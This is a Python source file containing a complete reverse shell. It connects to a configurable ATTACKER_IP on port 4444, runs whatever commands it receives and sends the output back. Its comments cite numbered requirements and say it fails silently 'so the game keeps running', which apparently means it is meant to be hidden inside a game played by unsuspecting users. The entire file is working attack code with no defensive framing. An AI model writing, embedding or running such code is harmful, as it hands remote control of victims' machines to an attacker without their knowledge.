import socket
import subprocess
import os

def start_connection():
    # --- IMPORTANT: CHANGE THIS TO YOUR ATTACKER IP ---
    ATTACKER_IP = "127.0.0.1" 
    PORT = 4444
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, PORT))
        
        while True:
            # Wait for command from attacker
            command = s.recv(1024).decode()
            
            if command.lower() == "exit":
                break
            
            # Execute command and capture output (Requirement 2)
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    output = f"Changed directory to {os.getcwd()}"
                except Exception as e:
                    output = str(e)
            else:
                output = subprocess.getoutput(command)
            
            # Send results back
            if not output:
                output = "Command executed (No output)."
            s.send(output.encode())
            
        s.close()
    except:
        pass # Silently fail so the game keeps running (Requirement 4)